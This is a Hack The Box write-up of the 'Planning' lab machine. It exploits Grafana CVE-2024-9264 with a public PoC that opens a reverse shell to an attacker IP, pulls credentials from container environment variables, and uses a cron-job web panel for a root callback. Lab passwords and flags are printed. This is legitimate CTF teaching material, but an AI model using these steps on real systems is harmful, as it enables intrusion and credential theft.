---
title: 'HTB Writeup - Planning'
date: 2025-11-11 17:00:00 +0000
categories: [HTB Easy Machines]
tags: [Easy, Linux, HTB, CVE-2024-9264, Local Port Forward, Grafana, Crontab, Docker]
---

<img src="/assets/img/planning/image2.png" alt="/assets/img/planning/image2.png">

Planning is an easy HTB machine where you have to find a `subdomain` running `Grafana`, using the credentials provided we abuse a `CVE` to gain root access to a `docker`, where we can then move laterally to the main box. Finally we abuse `crontab` to gain root access.

# Reconnaissance
```bash
[t3mpx@parrot]─[~/htb/easy/planning]
└──★$ nmap -np- -Pn -sVC --min-rate 5000 -oN nmap-scan.txt 10.10.11.68
Nmap scan report for 10.10.11.68
Host is up (0.058s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA)
|_  256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://planning.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun May 11 11:21:34 2025 -- 1 IP address (1 host up) scanned in 33.96 seconds
```
> SSH, HTTP

> Let’s add the domain to our /etc/hosts file: `echo -e '10.10.11.68\tplanning.htb' | sudo tee -a /etc/hosts`

Let's take a look at [http://planning.htb](http://planning.htb):
<img src="/assets/img/planning/image2.png" alt="/assets/img/planning/image2.png">
> Rabbit hole...

Fuzzing for subdomains return the following:
```bash
[t3mpx@parrot]─[~/htb/easy/planning]
└──★$ ffuf -u http://planning.htb/ -c -w /opt/SecLists/Discovery/DNS/bug-bounty-program-subdomains-trickest-inventory.txt:FUZZ -H 'Host: FUZZ.planning.htb' 
-ic -sa -mc all -fc 404 -o vhost_fuzz.txt -fs 23914 -r                                                                                                      
                                       
        /'___\  /'___\           /'___\        
       /\ \__/ /\ \__/  __  __  /\ \__/        
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\        
          \/_/    \/_/   \/___/    \/_/        

       v2.1.0-dev
________________________________________________

<SNIP>

________________________________________________

grafana                 [Status: 200, Size: 38241, Words: 2697, Lines: 324, Duration: 44ms]
```
> Notice the not so usual wordlist

# Exploit
## CVE-2024-9264
Visiting [http://grafana.planning.htb](http://grafana.planning.htb) gives us the version of Grafana on the bottom right:
<img src="/assets/img/planning/image3.png" alt="/assets/img/planning/image3.png">
>A quick google search returns a RCE [CVE](https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit) exploit.

```bash
[t3mpx@parrot]─[~/htb/easy/planning]
└──★$ python3 poc.py  --url http://grafana.planning.htb --username admin --password 0D5oT70Fq13EvB5r --reverse-ip 10.10.14.20 --reverse-port 9001           
[SUCCESS] Login successful!
Reverse shell payload sent successfully!
Set up a netcat listener on 9001
```

```bash
[t3mpx@parrot]─[~/htb/easy/planning]
└──★$ nc -nvlp 9001
listening on [any] 9001 ...
connect to [10.10.14.20] from (UNKNOWN) [10.10.11.68] 48220
sh: 0: can't access tty; job control turned off
# script -c bash /dev/null
Script started, output log file is '/dev/null'.
root@7ce659d667d7:~#
```
> We are inside a docker container

# Lateral Movement
## Shell as enzo

Checking the env variables of the docker container we come across the credentials of the user enzo:
```bash
root@7ce659d667d7:~# env
env
AWS_AUTH_SESSION_DURATION=15m
HOSTNAME=7ce659d667d7
PWD=/usr/share/grafana
AWS_AUTH_AssumeRoleEnabled=true
GF_PATHS_HOME=/usr/share/grafana
AWS_CW_LIST_METRICS_PAGE_LIMIT=500
HOME=/usr/share/grafana
AWS_AUTH_EXTERNAL_ID=
SHLVL=2
GF_PATHS_PROVISIONING=/etc/grafana/provisioning
GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
GF_SECURITY_ADMIN_USER=enzo
GF_PATHS_DATA=/var/lib/grafana
GF_PATHS_LOGS=/var/log/grafana
PATH=/usr/local/bin:/usr/share/grafana/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
AWS_AUTH_AllowedAuthProviders=default,keys,credentials
GF_PATHS_PLUGINS=/var/lib/grafana/plugins
GF_PATHS_CONFIG=/etc/grafana/grafana.ini
_=/usr/bin/env
```
> enzo:RioTecRANDEntANT!

```bash
[t3mpx@parrot]─[~/htb/easy/planning]
└──★$ sshpass -p 'RioTecRANDEntANT!' ssh enzo@planning.htb
enzo@planning:~$
```

### User flag
```bash
enzo@planning:~$ cat user.txt 
ca0880e425bd694d590d88c839527c6a
```

## Shell as root

After some enumeration, we come across some interesting stuff in `/opt/crontabs/crontab.db`:
```bash
enzo@planning:~$ cat /opt/crontabs/crontab.db
{"name":"Grafana backup","command":"/usr/bin/docker save root_grafana -o /var/backups/grafana.tar && /usr/bin/gzip /var/backups/grafana.tar && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz && rm /var/backups/grafana.tar.gz","schedule":"@daily","stopped":false,"timestamp":"Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740774983276,"saved":false,"_id":"GTI22PpoJNtRKg0W"}
{"name":"Cleanup","command":"/root/scripts/cleanup.sh","schedule":"* * * * *","stopped":false,"timestamp":"Sat Mar 01 2025 17:15:09 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740849309992,"saved":false,"_id":"gNIRXh1WIc9K7BYX"}
```
> Looks like some kind of crontab configuration and a possible password `P4ssw0rdS0pRi0T3c`

Looking at the open ports we see port 8000 open internally:
```bash
enzo@planning:~$ netstat -tulpn
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:42167         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.54:53           0.0.0.0:*                           -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                 
```

Let's set up a local port forward to see what's running:
```bash
sshpass -p 'RioTecRANDEntANT!' ssh -NL 8000:127.0.0.1:8000 enzo@planning.htb
```

We're greeted by an authentication panel:
<img src="/assets/img/planning/image4.png" alt="/assets/img/planning/image4.png">
>root:P4ssw0rdS0pRi0T3c works

Once inside, we see that we have the same config that we found in the previous file:
<img src="/assets/img/planning/image5.png" alt="/assets/img/planning/image5.png">

Let's create a new job and run it:
<img src="/assets/img/planning/image6.png" alt="/assets/img/planning/image6.png">

```bash
[t3mpx@parrot]─[~/htb/easy/planning]
└──★$ nc -nvlp 9001
listening on [any] 9001 ...
connect to [10.10.14.20] from (UNKNOWN) [10.10.11.68] 53844
bash: cannot set terminal process group (1364): Inappropriate ioctl for device
bash: no job control in this shell
root@planning:/#
```

### Root flag
root@planning:/# cat /root/root.txt
8f861c31c5e16db0bd2af08f5ca34417





